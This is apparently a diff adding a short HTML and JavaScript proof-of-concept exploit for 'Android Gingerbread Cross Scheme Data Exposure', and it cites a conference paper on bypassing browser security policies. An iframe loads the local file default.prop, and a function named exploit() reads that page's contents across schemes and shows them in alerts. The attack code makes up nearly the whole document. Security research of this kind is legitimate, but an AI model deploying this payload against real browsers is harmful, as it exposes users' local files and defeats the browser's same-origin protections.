@@ -1,0 +1,10 @@
+<iframe src="file:/default.prop" name="test" style='width:100%;height:200'></iframe>
+<script>
+    function exploit() {
+        var iframe = document.getElementsByTagName('iframe')[0]; try {
+            alert("Try to read local file.");
+            alert("innerHTML:" + iframe.contentWindow.document.body.innerHTML);
+        } catch (e) {
+            alert(e);
+        }
+    } </script> Android Gingerbread Cross Scheme Data Exposure asia-16-Baloch-Bypassing-Browser-Security-Policies-For-Fun-And-Profit-wp.pdf
